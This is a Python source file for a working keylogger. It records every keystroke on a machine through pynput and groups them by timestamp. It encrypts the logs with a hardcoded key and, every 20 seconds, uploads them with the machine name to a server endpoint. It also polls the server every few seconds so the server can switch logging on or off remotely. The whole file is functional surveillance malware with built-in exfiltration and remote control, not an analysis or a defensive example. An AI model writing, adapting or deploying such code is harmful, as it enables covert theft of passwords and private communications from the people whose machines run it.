import time
import requests
import threading
import json
from pynput import keyboard
from pynput.keyboard import Key
from cryptography.fernet import Fernet
import platform



class KeyLoggerService:
    def __init__(self):
        self.key_log_dict = {}
        self.all_logs = []

    def add_key(self, key):
        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
        if now_time in self.key_log_dict:
            self.key_log_dict[now_time].append(str(key))
        else:
            self.key_log_dict[now_time] = [str(key)]

    def save_and_clear(self):
        if self.key_log_dict:
            self.all_logs.append(self.key_log_dict)
            self.key_log_dict = {}
        return self.all_logs

    def get_logs(self):
        return self.all_logs

    def clear_logs(self):
        self.all_logs = []

class ServerSender:
    def __init__(self, server_url, service, machine_name= platform.node() ):
        self.server_url = server_url
        self.service = service
        self.machine_name = machine_name
        self.key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
        self.fernet = Fernet(self.key)
        threading.Thread(target=self.send_to_server, daemon=True).start()

    def send_to_server(self):
        while True:
            logs = self.service.get_logs()
            if logs:
                new_task = {
                    "machine": self.machine_name,
                    "data": logs
                }
                try:
                    encrypted_data = self.fernet.encrypt(json.dumps(new_task).encode())
                    headers = {"X-Machine-Name": self.machine_name}
                    response = requests.post(self.server_url, data=encrypted_data, headers=headers)
                    if not response.ok:
                        print(f"Upload failed: {response.status_code} {response.text}")
                    else:
                        print("Upload OK")
                        # Clear logs only on successful upload
                        self.service.clear_logs()
                except requests.exceptions.RequestException as e:
                    print(f"Error sending data: {e}")
            time.sleep(20)

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.machine_name = platform.node()
        self.server_base = "http://127.0.0.1:5000"
        self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
        self.listener = None
        # Start background poller to follow desired toggle state from server
        threading.Thread(target=self._poll_toggle_state, daemon=True).start()

    def handle_key_press(self, key):
        self.service.add_key(key)
        if key == Key.space:
            logs = self.service.save_and_clear()

    def start(self):
        if not self.listener:
            self.listener = keyboard.Listener(on_release=self.handle_key_press)
            self.listener.start()
            print("Keylogger started.")

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            print("Keylogger stopped.")

    def toggle(self, start=True):
        if start:
            if not self.listener:
                print("Starting keylogger...")
                self.start()
        else:
            self.stop()

    def _poll_toggle_state(self):
        while True:
            try:
                url = f"{self.server_base}/api/toggle"
                params = {"machine": self.machine_name}
                resp = requests.get(url, params=params, timeout=5)
                if resp.ok:
                    desired = resp.json().get("status")
                    if desired is True and not self.listener:
                        self.start()
                    elif desired is False and self.listener:
                        self.stop()
            except requests.exceptions.RequestException as e:
                print(f"Toggle poll error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.toggle(start=True)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
        print("Program exited.")
